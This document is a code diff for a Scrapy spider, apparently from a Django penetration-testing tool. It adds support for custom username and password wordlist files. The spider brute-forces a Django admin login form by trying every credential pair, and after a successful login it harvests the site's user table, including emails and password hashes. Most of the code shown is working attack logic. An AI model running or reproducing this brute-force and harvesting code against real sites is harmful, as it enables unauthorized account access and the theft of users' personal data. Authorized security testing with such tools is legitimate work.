@@ -1,10 +1,11 @@
 # -*- coding:utf-8 -*-
 
+from res.vmnf_validators import check_file
 from scrapy.exceptions import CloseSpider
-from scrapy.http import HtmlResponse
 from neotermcolor import colored,cprint
+from scrapy.http import HtmlResponse
 from urllib.parse import urljoin
-from datetime import datetime
+from datetime import datetime 
 from .. res import config
 from time import sleep 
 import requests
@@ -24,19 +25,47 @@ class jungle_engine(scrapy.Spider):
     def __init__(self, *args,**handler):
         super(jungle_engine, self).__init__(*args,**handler)
         self.handler = handler
+
         self.start_urls = [
                 urljoin(handler.get('target_url'), 
                     config.admin_redir_path)
         ]
         
+        # Default settings
+        self.usernames = config.usernames
+        self.passwords = config.passwords
+        self.userlen = config.userlen
+        self.passlen = config.passlen
+
+        if handler['usernames_file']:
+            usernames_file = handler.get('usernames_file')
+
+            if not check_file(usernames_file,True):
+                print(f"\n[jungle:{datetime.now()}] → Invalid usernames file.")
+                os._exit(os.EX_OK)
+
+            self.usernames = open(usernames_file, 'r').readlines()
+            self.userlen = len(self.usernames)
+
+        if handler['passwords_file']:
+            passwords_file = handler.get('passwords_file')
+
+            if not check_file(passwords_file,True):
+                print(f"\n[jungle:{datetime.now()}] → Invalid passwords file.")
+                os._exit(os.EX_OK)
+
+            self.passwords = open(passwords_file, 'r').readlines()
+            self.passlen = len(self.passwords)
+            
         self.pool = {
             'credentials': [],
             'request_auth_data': {}
         } 
 
         if not self.start_urls:
-            self.log('[jungler:{}] Missing scope: endpoint'.format(datetime.now()))
-            print('Missing scope')
+            self.log(f'[jungle:{datetime.now()}] Missing scope: endpoint')
+            print(f'[jungle:{datetime.now()}] Missing scope: endpoint')
+
             return
         
         self.verbose_enabled = handler.get('verbose', False)
@@ -56,7 +85,7 @@ class jungle_engine(scrapy.Spider):
         )
         print('{:>30}: {} / {}'.format(
             colored('users','blue'),
-            colored(str(config.userlen),'green'),
+            colored(str(self.userlen),'green'),
             colored(config.raw_path.format(
                 config.user_file
                 ),'green')
@@ -64,7 +93,7 @@ class jungle_engine(scrapy.Spider):
         )
         print('{:>30}: {} / {}'.format(
             colored('passwords:','blue'),
-            colored(str(config.passlen),'green'),
+            colored(str(self.passlen),'green'),
             colored(config.raw_path.format(
                 config.pass_file
                 ),'green')
@@ -77,15 +106,19 @@ class jungle_engine(scrapy.Spider):
         self.log('[jungler:{}] Accessing endpoint: {}'.format(datetime.now(),response.url))
         
         print()
-        for username in config.usernames:
-            for password in config.passwords:
+        for username in self.usernames:
+            for password in self.passwords:
+
+                username = username.strip()
+                password = password.strip()
+
                 if self.verbose_enabled and not self.sample_mode:
-                    print('{:>30}:{}'.format(username.strip(), password.strip()))
-                    sleep(0.05)
+                    print(f'{username:>30}:{password}')
+                    sleep(0.03)
 
                 auth_data={
-                    'username': username.strip(),
-                    'password': password.strip(),
+                    'username': username,
+                    'password': password,
                 }
                 
                 yield scrapy.FormRequest.from_response(
@@ -124,8 +157,8 @@ class jungle_engine(scrapy.Spider):
                         'round_hash': config.round_hash,
                         'user_file_hash': config.user_file_hash,
                         'pass_file_hash': config.pass_file_hash,
-                        'num_pass': config.passlen,
-                        'num_users': config.userlen
+                        'num_pass': self.passlen,
+                        'num_users': self.userlen
                     }
                     
                 }
@@ -224,14 +257,6 @@ class jungle_engine(scrapy.Spider):
             hl_session_id = colored(session_id, 'blue')
             print(f"\t  → {msg}")
 
-            """
-            print('[{}] → {}...\n'.format(
-                colored(datetime.now(), 'cyan'),
-                colored("User {} does not have permission to log into Django's administrative endpoint.".format(
-                    self.auth_meta.get('username')), 'white', attrs=['bold'])
-                )
-            )
-            """
             return 
         
         self.users_table.append(
@@ -268,7 +293,16 @@ class jungle_engine(scrapy.Spider):
                     first_name = colored(first_name, 'green')
                     last_name = colored(last_name, 'green')
 
-                self.users_table.append([user_id, staff_status, username, user_email, user_password, first_name,last_name])
+                self.users_table.append(
+                        [
+                            user_id, 
+                            staff_status, 
+                            username, 
+                            user_email, 
+                            user_password, 
+                            first_name,last_name
+                        ]
+                )
 
         print(tabulate(
             self.users_table,
